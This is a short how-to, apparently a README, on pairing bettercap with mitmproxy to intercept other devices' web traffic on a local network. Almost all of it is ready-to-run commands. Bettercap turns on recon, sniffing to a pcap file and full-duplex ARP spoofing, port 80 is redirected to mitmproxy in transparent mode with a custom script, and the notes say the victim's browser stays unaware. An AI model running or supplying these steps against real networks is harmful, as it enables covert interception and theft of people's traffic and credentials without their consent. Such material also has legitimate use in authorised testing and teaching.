How to set up mitmproxy with bettercap
======================================
Step 1: make sure desired port is unused (8080 in this context)
-----------------------------------------------
- mitmproxy will listen on this port

Step 2: run bettercap with following commands:
----------------------------------------------
```bettercap
set net.sniff.verbose true;
set net.sniff.output [FILENAME.pcap];
set arp.spoof.fullduplex true;
set arp.spoof internal true;
net.recon on;
net.probe on;
net.sniff on;
arp.spoof on;
```
- this will activate modules to let the arp.spoof module function
- after stopping the module net.sniff with ```net.sniff off```, it will write the traffic in FILENAME.pcap

Step 3: let bettercap redirect traffic to mitmproxy
---------------------------------------------------
```bettercap
set arp.proxy.dst_port 8080;
set arp.proxy.src_port 80;
arp.proxy on
```

Step 4: run mitmproxy with following code:
------------------------------------------
```bash
sudo mitmproxy --mode transparent -p 8080 -s [SCRIPT.py]
```
* mitmproxy has to run in transparent mode because target browser is unaware of the proxy
    * normally, the browser knows if mitmproxy is listening and this requires manual setup on the browser side
    * transparent mode goes under the assumption that the browser isn't aware of it listening (necessary for intercepting)
* -s SCRIPT.py tells mitmproxy which python script to use
